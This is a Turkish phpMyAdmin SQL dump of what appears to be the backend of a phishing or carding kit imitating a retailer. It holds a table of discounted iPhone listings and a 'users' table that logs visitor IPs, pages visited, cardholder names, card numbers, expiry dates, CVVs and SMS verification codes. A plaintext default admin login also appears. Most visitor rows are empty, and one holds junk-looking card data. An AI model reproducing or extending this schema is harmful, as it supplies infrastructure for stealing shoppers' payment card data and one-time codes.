-- phpMyAdmin SQL Dump
-- version 4.9.7
-- https://www.phpmyadmin.net/
--
-- Anamakine: localhost:3306
-- Üretim Zamanı: 16 May 2023, 01:41:22
-- Sunucu sürümü: 5.6.51-cll-lve
-- PHP Sürümü: 7.4.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `a101_h`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` text NOT NULL,
  `password` text NOT NULL,
  `role` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Tablo döküm verisi `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`, `role`) VALUES
(1, 'root@gmail.com', 'root', 'admin');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `products`
--

CREATE TABLE `products` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `balance` text NOT NULL,
  `img` text NOT NULL,
  `urun_code` text NOT NULL,
  `description` text NOT NULL,
  `marka` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Tablo döküm verisi `products`
--

INSERT INTO `products` (`id`, `name`, `balance`, `img`, `urun_code`, `description`, `marka`) VALUES
(1, 'Apple iPhone 14 Pro 256 GB Cep Telefonu Gold\r\n', '44,5432 TL', 'https://ayb.akinoncdn.com/products/2023/03/17/2294006/0b50fbd4-83f8-47e1-b547-ca15f4d21742_size780x780_quality60_cropCenter.jpg', '3423432434', 'TELEFON', ''),
(17, 'Apple iPhone 13 512 GB Cep Telefonu Kırmızı', '30.999TL', 'https://ayb.akinoncdn.com/products/2021/10/15/79895/cdd15b0b-e1c9-4859-8fb3-c86f5b5d9608_size780x780_quality60_cropCenter.jpg', '26020878002', '', ''),
(18, 'Apple iPhone 13 512 GB Cep Telefonu Siyah', '30.999TL', 'https://ayb.akinoncdn.com/products/2021/10/15/79897/7202d479-fbbc-4090-aad0-6a23cd37a4df_size780x780_quality60_cropCenter.jpg', '26020878004', '', ''),
(19, 'Apple iPhone 13 512 GB Cep Telefonu Beyaz', '30.999TL', 'https://ayb.akinoncdn.com/products/2021/10/15/79894/1a97eecb-2266-48db-9a6c-03c92fc38293_size780x780_quality60_cropCenter.jpg', '26020878001', '', ''),
(21, 'Apple iPhone 14 Plus 512 GB Cep Telefonu Mavi', '39.499TL', 'https://ayb.akinoncdn.com/products/2023/01/04/2283455/8f3cd650-8eec-4eb8-be93-c893100a0a52_size780x780_quality60_cropCenter.jpg', '26029975003', '', ''),
(22, 'Apple iPhone 14 Plus 512 GB Cep Telefonu Mor', '39.499TL', 'https://ayb.akinoncdn.com/products/2022/12/27/2285617/869fcc3a-a7a6-4c08-b6ed-395b774e2ee5_size780x780_quality60_cropCenter.jpg', '26029975005', '', ''),
(23, 'Apple iPhone 14 Plus 512 GB Cep Telefonu Kırmızı', '39.499TL', 'https://ayb.akinoncdn.com/products/2022/12/27/2285618/77f01197-78df-4c69-b6df-043c4390adcd_size780x780_quality60_cropCenter.jpg', '26029975004', '', ''),
(24, 'Apple iPhone 14 Plus 128 GB Cep Telefonu Mor', '33.799TL', 'https://ayb.akinoncdn.com/products/2022/10/31/2218616/34f52f28-d436-4d18-b586-700c55afdc61_size780x780_quality60_cropCenter.jpg', '26029973002', '', ''),
(25, 'Apple iPhone 14 Plus 512 GB Cep Telefonu Beyaz', '39.499TL', 'https://ayb.akinoncdn.com/products/2022/10/31/2218608/5b9317cf-a680-4580-a188-f7931e0d8bc4_size780x780_quality60_cropCenter.jpg', '26029975001', '', ''),
(27, 'Apple iPhone 14 Plus 128 GB Cep Telefonu Kırmızı', '33.799TL', 'https://ayb.akinoncdn.com/products/2022/10/31/2225436/d8470380-b1ae-4fe8-a4cf-e01d25028cbb_size780x780_quality60_cropCenter.jpg', '26029973003', '', ''),
(28, 'Apple iPhone 14 Plus 256 GB Cep Telefonu Kırmızı', '35.999TL', 'https://ayb.akinoncdn.com/products/2022/11/24/2267735/6d3367c5-8c60-4782-a1a4-b22a4ce243da_size780x780_quality60_cropCenter.jpg', '26029974005', '', ''),
(29, 'Apple iPhone 3. Nesil SE 64 GB Cep Telefonu Siyah', '14.399TL', 'https://ayb.akinoncdn.com/products/2023/04/24/147699/28838b82-5a3d-4210-b36b-755b1cb05dfa_size780x780_quality60_cropCenter.jpg', '26026829002', '', ''),
(30, 'Apple iPhone 14 Plus 128 GB Cep Telefonu Gece Yarısı', '33.799TL', 'https://ayb.akinoncdn.com/products/2023/04/24/2225435/22f42f2d-6538-4563-bafb-c4b297a2d73c_size780x780_quality60_cropCenter.jpg', '26029973004', '', ''),
(31, 'Apple iPhone 12 128 GB Cep Telefonu Siyah', '22.499TL', 'https://ayb.akinoncdn.com/products/2023/04/24/144512/26c34c50-33cd-4d0f-80b8-38a7bcaaef5c_size780x780_quality60_cropCenter.jpg', '26024270004', '', ''),
(32, 'Apple iPhone 14 Pro 512 GB Cep Telefonu Gümüş', '45.499TL', 'https://ayb.akinoncdn.com/products/2023/04/24/2218496/7834bee6-b51f-405e-83cd-c7df546bedc0_size780x780_quality60_cropCenter.jpg', '26029967002', '', ''),
(33, 'Apple iPhone 14 Pro 512 GB Cep Telefonu Siyah', '44.499TL', 'https://ayb.akinoncdn.com/products/2023/04/24/2296606/5c61a596-ab93-4470-90bb-85130fca4848_size780x780_quality60_cropCenter.jpg', '26029967003', '', ''),
(34, 'Apple iPhone 3. Nesil SE 64 GB Cep Telefonu Beyaz', '14.399TL', 'https://ayb.akinoncdn.com/products/2023/04/24/147698/3585e680-b1bd-48ed-92bd-f91160cf8c69_size780x780_quality60_cropCenter.jpg', '26026829001', '', ''),
(36, 'Apple iPhone 14 Plus 256 GB Cep Telefonu Beyaz', '34.999TL', 'https://ayb.akinoncdn.com/products/2023/04/24/2218609/a0de0e5b-aeb5-40dc-9927-c254e08c4a65_size780x780_quality60_cropCenter.jpg', '26029974001', '', ''),
(37, 'Apple iPhone 14 Plus 256 GB Cep Telefonu Mavi', '34.999TL', 'https://ayb.akinoncdn.com/products/2023/04/24/2218603/64ad73f1-d557-49aa-a4fa-e9a26be97a3c_size780x780_quality60_cropCenter.jpg', '26029974002', '', ''),
(38, 'Apple iPhone 14 Plus 256 GB Cep Telefonu Siyah', '34.999TL', 'https://ayb.akinoncdn.com/products/2023/04/24/2218607/9d023540-4048-4ce8-ba17-f2a07588b25e_size780x780_quality60_cropCenter.jpg', '26029974004', '', ''),
(39, 'Apple iPhone 13 256 GB Cep Telefonu Yeşil', '25.999TL', 'https://ayb.akinoncdn.com/products/2023/04/24/144065/cc39f4b8-b2ac-4a3b-9024-92a8134df43c_size780x780_quality60_cropCenter.jpg', '26020877006', '', ''),
(40, 'Apple iPhone 12 64 GB Cep Telefonu Beyaz', '20.799', 'https://ayb.akinoncdn.com/products/2023/04/24/72482/3542c633-d7dd-4ec7-81f7-37cafb243f25_size780x780_quality60_cropCenter.jpg', '26019626001', '', ''),
(41, 'Apple iPhone 12 64 GB Cep Telefonu Mavi', '20.799TL', 'https://ayb.akinoncdn.com/products/2023/04/24/143193/f0280313-8bc8-4c1c-a2e8-16c9026771fa_size780x780_quality60_cropCenter.jpg', '26019626005', '', ''),
(42, 'Apple iPhone 12 64 GB Cep Telefonu Siyah', '20.799TL', 'https://ayb.akinoncdn.com/products/2023/04/24/72484/14e86fbc-0d50-474e-8992-487ba700005b_size780x780_quality60_cropCenter.jpg', '26019626002', '', ''),
(43, 'Apple iPhone 14 Pro 256 GB Cep Telefonu Gold', '42.549TL', 'https://ayb.akinoncdn.com/products/2022/10/31/2218491/85baecca-a314-491e-aa1b-1c9791d004e8_size780x780_quality60_cropCenter.jpg', '26029966001', '', ''),
(44, 'Apple iPhone 14 Pro 256 GB Cep Telefonu Mor', '42.549TL', 'https://ayb.akinoncdn.com/products/2023/03/17/2294006/0b50fbd4-83f8-47e1-b547-ca15f4d21742_size780x780_quality60_cropCenter.jpg', '26029966003', '', ''),
(45, 'Apple iPhone 11 64 GB Cep Telefonu Siyah', '13.999TL', 'https://ayb.akinoncdn.com/products/2021/07/06/63580/e8639872-534c-4bf6-a78d-8627c33a3337_size780x780_quality60_cropCenter.jpg', '26017958002', '', ''),
(46, 'Apple iPhone 11 64 GB Cep Telefonu Beyaz', '13.999TL', 'https://ayb.akinoncdn.com/products/2021/04/06/63576/27c4b4a3-fd99-47ee-b067-547c7adddff7_size780x780_quality60_cropCenter.jpg', '26017958001', '', '');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `ip` text NOT NULL,
  `basket` text NOT NULL,
  `page` text NOT NULL,
  `isim` text NOT NULL,
  `cc_number` text NOT NULL,
  `skt` text NOT NULL,
  `cvv` text NOT NULL,
  `basket_urun` text NOT NULL,
  `status` text NOT NULL,
  `sms` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Tablo döküm verisi `users`
--

INSERT INTO `users` (`id`, `ip`, `basket`, `page`, `isim`, `cc_number`, `skt`, `cvv`, `basket_urun`, `status`, `sms`) VALUES
(1, '172.69.251.198', '1', 'Youtubede Şarkı', 'AFADFADFDA ADFADF', '2341324234324331', '23/413', '234', '44,5432 TL', '8', '455'),
(2, '172.71.178.65', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(3, '172.71.222.236', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(4, '162.158.107.36', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(5, '162.158.107.35', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(6, '172.70.38.136', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(7, '162.158.222.122', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(8, '172.70.39.71', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(9, '172.69.250.199', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(10, '172.70.223.162', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(11, '172.70.223.162', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(12, '172.70.223.161', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(13, '172.71.150.38', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(14, '108.162.245.174', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(15, '172.71.150.179', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(16, '172.71.147.74', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(17, '172.70.85.38', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(18, '172.68.102.121', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(19, '172.68.238.135', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(20, '162.158.79.235', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(21, '172.70.135.121', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(22, '172.70.131.145', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(23, '172.70.46.143', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(24, '172.70.251.130', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(25, '172.70.218.89', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(26, '172.70.188.64', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(27, '172.71.94.79', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(28, '172.71.167.187', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(29, '172.70.127.64', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(30, '108.162.238.55', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(31, '172.70.135.90', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(32, '172.70.218.211', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(33, '172.71.178.137', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(34, '172.70.188.65', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(35, '172.70.92.223', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(36, '172.70.92.222', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(37, '162.158.178.140', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(38, '172.71.218.28', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(39, '172.71.215.71', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(40, '172.71.211.15', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(41, '108.162.237.144', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(42, '162.158.170.70', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(43, '162.158.170.71', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(44, '141.101.98.88', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(45, '141.101.98.89', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(46, '162.158.189.69', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(47, '162.158.189.68', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(48, '172.70.147.87', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(49, '172.70.46.3', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(50, '172.71.222.249', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(51, '172.70.43.42', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(52, '162.158.170.174', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(53, '162.158.170.175', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(54, '172.71.98.140', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(55, '172.70.134.219', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(56, '108.162.238.90', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(57, '108.162.226.83', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(58, '108.162.226.207', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(59, '172.70.90.29', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(60, '172.71.167.15', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(61, '172.71.214.21', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(62, '172.71.218.20', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(63, '162.158.179.78', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(64, '172.71.214.216', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(65, '172.71.210.61', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(66, '172.71.175.56', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(67, '172.68.102.24', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(68, '172.71.210.32', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(69, '172.70.147.91', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(70, '172.68.238.144', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(71, '172.70.174.14', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(72, '172.71.6.64', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(73, '162.158.107.58', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(74, '162.158.107.57', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(75, '172.71.130.72', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(76, '172.71.178.190', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(77, '172.70.206.241', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(78, '162.158.238.210', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', ''),
(79, '172.69.199.153', '0', 'Ana Sayfa', '', 'Girilmedi', 'Girilmedi', 'Girilmedi', 'Ürün Eklenmedi', '1', '');

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `products`
--
ALTER TABLE `products`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `products`
--
ALTER TABLE `products`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=47;

--
-- Tablo için AUTO_INCREMENT değeri `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=80;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
